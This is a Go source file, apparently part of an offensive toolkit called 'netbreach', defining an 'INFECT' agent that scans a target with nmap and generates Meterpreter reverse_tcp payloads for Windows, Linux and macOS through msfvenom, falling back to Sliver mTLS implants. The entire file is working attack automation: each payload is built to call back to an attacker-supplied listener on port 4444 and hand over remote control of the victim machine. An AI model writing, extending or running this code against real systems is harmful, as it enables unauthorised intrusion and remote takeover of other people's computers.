// INFECT — Initial Access & Payload Delivery Agent
// msfvenom, empire, sliver, nishang

package netbreach

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
)

// InfectAgent handles initial access and payload generation
type InfectAgent struct {
	bus    *EventBus
	state  *SharedState
	stopCh chan struct{}
	msgCh  chan AgentMessage
}

func NewInfectAgent(bus *EventBus, state *SharedState) *InfectAgent {
	return &InfectAgent{bus: bus, state: state, stopCh: make(chan struct{}), msgCh: make(chan AgentMessage, 100)}
}

func (a *InfectAgent) Name() string  { return "INFECT" }
func (a *InfectAgent) Status() string { return "online" }

func (a *InfectAgent) Start() {
	a.bus.Subscribe("INFECT", a.msgCh)
	for {
		select {
		case msg := <-a.msgCh:
			a.Handle(msg)
		case <-a.stopCh:
			return
		}
	}
}

func (a *InfectAgent) Stop() { close(a.stopCh) }

func (a *InfectAgent) Handle(msg AgentMessage) {
	switch msg.Type {
	case "RECON":
		a.reconTarget(msg.Data)
	case "PAYLOAD":
		a.generatePayload(msg.Data)
	}
}

func (a *InfectAgent) broadcast(msg string) {
	a.bus.Broadcast(AgentMessage{From: "INFECT", To: "ALL", Type: "LOG", Data: msg})
}

func (a *InfectAgent) reconTarget(target string) {
	a.broadcast(fmt.Sprintf("[INFECT] Reconnaissance on: %s", target))

	// nmap quick scan
	if out, err := exec.Command("nmap", "-sS", "-T4", "-F", target).CombinedOutput(); err == nil {
		output := string(out)
		a.broadcast("[INFECT] nmap scan complete")
		for _, line := range strings.Split(output, "\n") {
			if strings.Contains(line, "open") {
				a.broadcast(fmt.Sprintf("[INFECT] %s", line))
			}
		}
	}

	// Trigger PIVOT to assess protocols
	a.bus.Broadcast(AgentMessage{From: "INFECT", To: "PIVOT", Type: "PROTOCOL_CHECK", Data: target})
}

func (a *InfectAgent) generatePayload(data string) {
	parts := strings.Split(data, ":")
	if len(parts) < 2 {
		a.broadcast("[!] Usage: PAYLOAD <os:listener>")
		return
	}
	osType := parts[0]
	listener := parts[1]

	outputFile := fmt.Sprintf("/tmp/payload_%s.exe", osType)
	if osType == "linux" {
		outputFile = fmt.Sprintf("/tmp/payload_%s.elf", osType)
	}
	if osType == "macos" {
		outputFile = fmt.Sprintf("/tmp/payload_%s.macho", osType)
	}

	// msfvenom payload generation
	var cmd *exec.Cmd
	switch osType {
	case "windows":
		cmd = exec.Command("msfvenom", "-p", "windows/x64/meterpreter/reverse_tcp",
			"LHOST="+listener, "LPORT=4444", "-f", "exe", "-o", outputFile)
	case "linux":
		cmd = exec.Command("msfvenom", "-p", "linux/x64/meterpreter/reverse_tcp",
			"LHOST="+listener, "LPORT=4444", "-f", "elf", "-o", outputFile)
	case "macos":
		cmd = exec.Command("msfvenom", "-p", "osx/x64/meterpreter/reverse_tcp",
			"LHOST="+listener, "LPORT=4444", "-f", "macho", "-o", outputFile)
	default:
		a.broadcast("[!] Unknown OS type: " + osType)
		return
	}

	if out, err := cmd.CombinedOutput(); err == nil {
		if _, statErr := os.Stat(outputFile); statErr == nil {
			a.broadcast(fmt.Sprintf("[INFECT] Payload generated: %s", outputFile))
		} else {
			_ = out
		}
	} else {
		// Fallback: sliver
		if out2, err2 := exec.Command("sliver-client", "generate", "--mtls", listener,
			"--save", outputFile).CombinedOutput(); err2 == nil {
			a.broadcast(fmt.Sprintf("[INFECT] Sliver payload: %s", outputFile))
			_ = out2
		} else {
			a.broadcast(fmt.Sprintf("[!] Payload generation failed: %v", err))
		}
	}
}
